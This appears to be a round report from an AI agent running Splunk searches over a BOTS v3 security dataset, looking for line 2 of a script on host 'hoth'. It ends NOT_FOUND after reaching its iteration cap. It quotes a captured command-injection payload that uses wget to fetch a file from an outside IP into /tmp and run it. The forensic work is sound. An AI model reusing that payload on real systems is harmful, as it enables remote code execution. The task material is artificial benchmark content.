# s2 - Q328 - Round 3
_stamped by runner: rounds_remaining=1 novel_spl=2_
**Scope:** sourcetype=access_combined | source=/var/log/httpd/access_log,/var/log/apache2/access.log | fields=host,url,uri,path,filename,ping_ip,command,process,message
**Insight:** NOT_FOUND
**Candidate:** none   **Confidence:** 12

## Prior rounds
1. Bash history and linux audit/ps/osquery FIM had already established the likely file path on hoth.
2. osquery and syslog confirmed hoth and showed metadata-rich telemetry, but not the target script body.
3. Cron and package telemetry existed but did not surface a content-preserving copy.
4. Access_combined was identified as a promising artifact family because it preserves request parameters.
5. A preserved ping_ip parameter showed an injected shell command that downloads and executes /tmp/rz.
6. No verified line 2 text was recovered yet.

## This round
### What I ran
- `get_field_values(field="ping_ip", index="botsv3", sourcetype="access_combined", source="/var/log/httpd/access_log", top_n=20)` -> 1 event; ping_ip preserved `google.ca ; cd /tmp; wget http://178.128.11.199/rvs -O /tmp/rz; chmod 777 /tmp/rz; sh /tmp/rz`.
- `get_raw_events(..., keyword="ping_ip", limit=5)` -> 1 raw access line showing the luci nslookup exploit request.
- `get_raw_events(..., keyword="definitelydontinvestigatethisfile", limit=20)` -> 0 results.
- `get_raw_events(..., keyword="colonelnew", limit=20)` -> 0 results.
- `get_raw_events(..., keyword="tomcat8", limit=20)` -> 0 results.
- `get_raw_events(..., keyword="echo", limit=20)` -> 0 results.
- `run_splunk_search(...)` exact-path search for the script name in uri/url/filename/message -> 0 results.
- `run_splunk_search(...)` for wget/curl/echo/cat markers in ping_ip/uri -> 0 results.
### What it means
NOT_FOUND: access logs do preserve command parameters and show a web exploit that fetched and executed a payload, but I did not find any request parameter, file reference, or service log line that reproduces the contents of `/tmp/definitelydontinvestigatethisfile.sh`. The exact line 2 remains unrecovered.

## Ruled out
- Direct filename references in access_combined - no hit.
- colonelnew/tomcat8 access-log pivot terms - no hit in sampled/raw inspection.
- Obvious request-parameter write primitives (echo/curl/wget/cat) in the limited access-log evidence - not recovered.

## Open questions for SH
- If another scope is allowed later, should we pivot from the downloaded `/tmp/rz` payload chain toward the web endpoint it exploited, or toward any secondary logs that capture spawned process arguments on hoth?

_Iteration cap reached: 8/8 iterations used this round — cut off, not finished._
